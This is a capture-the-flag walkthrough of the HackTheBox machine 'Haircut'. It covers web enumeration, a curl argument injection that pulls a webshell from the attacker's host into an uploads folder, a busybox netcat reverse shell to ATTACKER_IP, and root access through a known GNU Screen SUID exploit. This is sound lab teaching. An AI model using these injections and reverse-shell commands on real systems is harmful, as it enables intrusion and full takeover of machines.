## Welcome everyone!




Today, we will explore *Haircut*, a medium-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Haircut/Haircut_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP     haircut.htb`   to your local `/etc/hosts` file)




## Information Gathering


First, we will perform an aggressive Nmap scan to gather as much information as possible about the system we’re targeting:

![image](/HTB/Haircut/Haircut_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 7.2p2 | 22)

**HTTP** (nginx 1.10.0 (Ubuntu) | 80)

We can start by inspecting the website hosted on port **80**:

![image](/HTB/Haircut/Haircut_images/3.png)

We are greeted with this. Inspecting the source code of the page does not reveal anything interesting, nor does the image itself. We can use **Gobuster** to enumerate potential hidden web resources:

![image](/HTB/Haircut/Haircut_images/4.png)

We can identify two endpoints: `uploads`, which is forbidden to access, and `exposed.php`.

Attempting to access the `exposed.php` resource reveals the following:

![image](/HTB/Haircut/Haircut_images/5.png)



## Initial Access

It appears that the endpoint executes a `curl` system command to retrieve some file. We may be able to abuse the `curl` implementation by specifying our local IP and the port assigned to a Python server we could set up to host a **webshell** that the target server will download. Let’s try to upload it to the `/uploads` directory we saw before:

`http://10.10.14.9:8000/webshell.php -o /var/www/html/uploads/webshell.php`

![image](/HTB/Haircut/Haircut_images/6.png)

The webshell appears to have been uploaded successfully. Let's see if we can access it through the `/uploads` directory:

![image](/HTB/Haircut/Haircut_images/7.png)

Indeed, we can! We successfully achieved **remote code execution** by leveraging an **arbitrary file upload** vulnerability through **argument injection**.

We can now attempt to spawn a reverse shell by using the following command:

`busybox nc ATTACKER_IP NC_PORT -e sh`

(ensure that you have set up a **netcat listener** using `nc -lvnp PORT` to catch the connection)

![image](/HTB/Haircut/Haircut_images/8.png)

The request made should hang as above, resulting in a successfully established reverse shell, granting initial access to the target system as the **www-data** user.

Since our current shell has no job control, we can stabilize it using the following commands in order to execute system commands properly:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can start our local enumeration of the target system by checking the `/etc/passwd` file to see which non-root users exist:

![image](/HTB/Haircut/Haircut_images/9.png)

We can identify one user: **maria**. Can we access her `/home/maria` directory and retrieve the user flag?

![image](/HTB/Haircut/Haircut_images/10.png)

Yes! We retrieved the first flag without the need to perform horizontal privilege escalation.




## Privilege Escalation


We now need to escalate our current privileges to **root** in order to retrieve the final flag.

Since we do not have any password, we can’t run `sudo -l` to see whether we can execute any command with **root privileges**. Enumerating cron jobs and Linux capabilities does not reveal anything useful. However, listing binaries with the SUID bit set (via `find / -type f -perm -04000 2>/dev/null`), we can identify an uncommon configuration:

![image](/HTB/Haircut/Haircut_images/11.png)

An interesting `screen-4.5.0` binary has the **SUID bit** set and is owned by **root**. Inspecting its version with the `--version` option, we can observe that the executable is running **GNU Screen** version **4.05.00**. Searching for information about it leads us to a GitHub repository hosting a Bash script that perfectly matches the installed binary version:

![image](/HTB/Haircut/Haircut_images/12.png)

This PoC creates an `/etc/ld.so.preload` file pointing to a library that creates a setuid root shell and then calls screen again to trigger it.

We can download it and transfer it to the target in an accessible directory, such as `/tmp`:

![image](/HTB/Haircut/Haircut_images/13.png)

After granting it execute permissions, we can run it to generate the SUID binary that will allow us to escalate our privileges to **root**:

![image](/HTB/Haircut/Haircut_images/14.png)

The script has successfully been executed, granting **root access** and full control over the target machine.

We can now access the `/root` directory to retrieve the final flag:

![image](/HTB/Haircut/Haircut_images/15.png)

Challenge completed!

![image](/HTB/Haircut/Haircut_images/16.png)



## Conclusion

This challenge was very pleasant to complete. Starting with basic web enumeration, we discovered an endpoint allowing us to execute the `curl` system command and retrieve local files. However, the command was able to reach external hosts, such as our own machine. We exploited an arbitrary file upload vulnerability through through a `curl` argument injection vulnerability to upload a webshell that allowed us to gain an initial foothold on the machine. During the privilege escalation phase, we discovered an uncommon binary with the SUID bit set. After identifying its version, we found on the web a local exploit Bash script that allowed us to elevate our current privileges to root by generating a Bash binary with the root SUID bit set on it, which led to the complete compromise of the target system.

**Thank you for reading!**
